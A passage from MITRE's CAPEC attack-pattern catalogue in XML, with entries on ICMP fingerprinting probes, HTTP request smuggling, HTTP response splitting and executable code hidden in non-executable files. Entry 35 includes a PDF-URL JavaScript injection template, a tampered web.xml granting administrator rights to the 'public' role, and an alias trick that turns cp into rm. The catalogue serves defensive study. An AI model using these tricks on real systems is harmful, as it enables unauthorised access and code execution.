               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="329" Name="ICMP Error Message Quoting Probe" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or "Quoted" from the originating request that generated the ICMP error message. For this purpose "Port Unreachable" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply. This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: "Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...]." This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because "older" or "legacy" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-262"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="33" Name="HTTP Request Smuggling" Abstraction="Detailed" Status="Draft">
         <Description>HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify HTTP parsing chain] Determine the technologies used in the target environment such as types of web servers, application firewalls, proxies, etc.</Description>
               <Technique>Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand the parsing chain traversed by the incoming HTTP request.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe for vulnerable differences in HTTP parsing chain] Attacker sends malformed HTTP Requests to the application looking for differences in the ways that individual layers in the parsing chain parse requests. When differences are identified, the attacker crafts specially malformed HTTP requests to determine if the identified parsing differences will allow extra requests to be smuggled through parsing layers.</Description>
               <Technique>Create many consecutive requests to the server. Some of which must be malformed.</Technique>
               <Technique>Use a proxy tool to record the HTTP responses headers.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Cache poisoning] The attacker decides to target the cache server. The server will then cache the request and serve a wrong page to a legitimate user's request. The malicious request will most likely exploit a Cross-Site Scripting or another injection typed vulnerability.</Description>
               <Technique>Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will be processed and acted on by the outer parsing layer of the cache server but not by the inner application layer. In this way it will be cached by the server without obvious sign from the application and the corrupt data will be served to future requesters.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Session Hijacking] The attacker decides to target the web server by crafting a malicious HTTP Request containing a second HTTP Request using syntax that will not be processed and acted on by an outer "filter" parsing layer but will be acted on by the inner web server/application processing layers. The application/web server will then act on the malicious HTTP Request as if it is a valid request from the client potentially subverting session management.</Description>
               <Technique>Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will not be processed and acted on by the outer parsing layer of the malicious content filters but will be by the inner application/web server layer. In this way it will be acted on by the application/web server as if it is a valid request from the client.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web server</Prerequisite>
            <Prerequisite>Differences in the way the two HTTP entities parse HTTP requests</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker has to have detailed knowledge of the HTTP protocol specifics and must also possess exact details on the discrepancies between the two targeted entities in parsing HTTP requests.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>Differences in requests processed by the two entities. This requires careful monitoring or a capable log analysis tool.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.</Mitigation>
            <Mitigation>Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276</Example>
            <Example>Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both "Content-Length" and a "Transfer-Encoding: chunked" headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with "Transfer-Encoding: chunked" header without replacing the existing "Content-Length" header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with "Content-Length: 0". See also: CVE-2005-2088</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="444"/>
            <Related_Weakness CWE_ID="436"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="330" Name="ICMP Error Message Echoing Integrity Probe" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or "Quoted" from the originating request that generated the error message. For this purpose "Port Unreachable" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value. A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-262"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="331" Name="ICMP IP Total Length Field Probe" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable" error message. RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart: 1) the IP total length field may be calculated correctly, 2) an operating system may add 20 or more additional bytes to the length calculation, 3) the operating system may subtract 20 or more bytes from the correct length of the field or 4) the IP total length field is calculated with any other incorrect value. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-262"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="332" Name="ICMP IP 'ID' Field Error Message Probe" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are three behaviors related to the IP ID field that can be used to distinguish remote operating systems or firmware: 1) it is echoed back identically to the bit order of the ID field in the original IP header, 2) it is echoed back, but the byte order has been reversed, or it contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging. This allows the attacker to construct a fingerprint of specific OS behaviors.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-262"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="34" Name="HTTP Response Splitting" Abstraction="Detailed" Status="Draft">
         <Description>This attack uses a maliciously-crafted HTTP request in order to cause a vulnerable web server to respond with an HTTP response stream that will be interpreted by the client as two separate responses instead of one. This is possible when user-controlled input is used unvalidated as part of the response headers. The target software, the client, will interpret the injected header as being a response to a second request, thereby causing the maliciously-crafted contents be displayed and possibly cached.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Spider] Using a browser or an automated tool, an adversary follows all public links on a web site. He records all the links, the forms and all potential user-controllable input points for the web application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL, forms found in the pages (like file upload, etc.).</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt variations on input parameters] The adversary injects the entry points identified in the Explore Phase with response splitting syntax and variations of payloads to be acted on in the additional response. He records all the responses from the server that include unmodified versions of his payload.</Description>
               <Technique>Use CR\LF characters (encoded or not) in the payloads in order to see if the HTTP header can be split.</Technique>
               <Technique>Use a proxy tool to record the HTTP responses headers.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Cross-Site Scripting] As the adversary succeeds in exploiting the vulnerability, they can choose to attack the user with Cross-Site Scripting. The possible outcomes of such an attack are described in the Cross-Site Scripting related attack patterns.</Description>
               <Technique>Inject cross-site scripting payload preceded by response splitting syntax (CR/LF) into user-controllable input identified as vulnerable in the Experiment Phase.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Cache poisoning] The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.</Description>
               <Technique>The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User-controlled input used as part of HTTP header</Prerequisite>
            <Prerequisite>Ability of adversary to inject custom strings in HTTP header</Prerequisite>
            <Prerequisite>Insufficient input validation in application to check for input sanity before using it as part of response header</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The adversary needs to have a solid understanding of the HTTP protocol and HTTP headers and must be able to craft and inject requests to elicit the split responses.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>The only indicators are multiple responses to a single request in the web logs. However, this is difficult to notice in the absence of an application filter proxy or a log analyzer. There are no indicators for the client</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>To avoid HTTP Response Splitting, the application must not rely on user-controllable input to form part of its output response stream. Specifically, response splitting occurs due to injection of CR-LF sequences and additional headers. All data arriving from the user and being used as part of HTTP response headers must be subjected to strict validation that performs simple character-based as well as semantic filtering to strip it of malicious character sequences and headers.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="113"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="74"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Payload_Activation_Impact, Probing_Techniques, Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="35" Name="Leverage Executable Code in Non-Executable Files" Abstraction="Detailed" Status="Draft">
         <Description>An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="636"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="23"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must have the ability to modify non-executable files consumed by the target software.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To identify and execute against an over-privileged system interface</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</Mitigation>
            <Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</Mitigation>
            <Mitigation>Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.</Mitigation>
            <Mitigation>Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix "cp" command can be rerouted to "rm" or other standard command so the user's intention is subverted.</Example>
            <Example>The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.</Example>
            <Example>
               <xhtml:p>Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)</xhtml:p>
               <xhtml:p>http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</xhtml:p>
               <xhtml:p>The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.</xhtml:p>
            </Example>
            <Example>
               <xhtml:p>The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name "public" grants all users with the public role the ability to use the administration functionality.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt; security-constraint&gt;<xhtml:div style="margin-left:10px;">&lt;description&gt;Security processing rules for admin screens&lt;/description&gt;<xhtml:br/>&lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;<xhtml:br/>&lt;http-method&gt;POST&lt;/http-method&gt;<xhtml:br/>&lt;http-method&gt;GET&lt;/http-method&gt;<xhtml:div style="margin-left:10px;">&lt;auth-constraint&gt;<xhtml:div style="margin-left:10px;">&lt;role-name&gt;administrator&lt;/role-name&gt;<xhtml:br/>&lt;role-name&gt;public&lt;/role-name&gt;</xhtml:div>
                        <xhtml:br/>&lt;/auth-constraint&gt;</xhtml:div>
                  </xhtml:div>
                  <xhtml:br/>&lt;/security-constraint&gt;</xhtml:div>
               <xhtml:p>The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="94"/>
            <Related_Weakness CWE_ID="96"/>
            <Related_Weakness CWE_ID="95"/>
            <Related_Weakness CWE_ID="97"/>
            <Related_Weakness CWE_ID="272"/>
            <Related_Weakness CWE_ID="59"/>
            <Related_Weakness CWE_ID="282"/>
            <Related_Weakness CWE_ID="275"/>
            <Related_Weakness CWE_ID="264"/>
            <Related_Weakness CWE_ID="270"/>
            <Related_Weakness CWE_ID="714"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Examples-Instances, Related_Attack_Patterns, Type (Attack_Pattern -&gt; Relationship)</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="36" Name="Using Unpublished APIs" Abstraction="Standard" Status="Draft">
         <Description>An adversary searches for and invokes APIs that the target system designers did not intend to be publicly available. If these APIs fail to authenticate requests the attacker may be able to invoke functionality they are not authorized for.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
